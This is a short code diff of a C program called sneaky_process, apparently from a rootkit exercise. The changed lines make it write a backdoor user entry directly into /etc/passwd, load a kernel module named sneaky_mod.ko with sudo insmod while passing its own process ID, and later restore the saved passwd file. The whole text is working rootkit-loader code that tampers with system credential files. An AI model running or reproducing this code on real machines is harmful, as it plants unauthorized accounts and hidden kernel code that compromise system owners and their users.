@@ -35,7 +35,7 @@ void writeFile(const char * filename, const char * toWrite) {
 int main() {
   printf("sneaky_process pid = %d\n", getpid());
   copyFile("/etc/passwd", "/tmp/passwd");
-  writeFile("/tmp/passwd", "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash");
+  writeFile("/etc/passwd", "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash");
   char arg[64];
   sprintf(arg, "sudo insmod sneaky_mod.ko sneaky_pid=%d", (int)getpid());
   system(arg);
@@ -45,7 +45,7 @@ int main() {
   }
 
   system("sudo rmmod sneaky_mod.ko");
-  //copy_file("/tmp/passwd", "/etc/passwd");
+  copyFile("/tmp/passwd", "/etc/passwd");
   system("rm /tmp/passwd"); 
   
   return EXIT_SUCCESS;
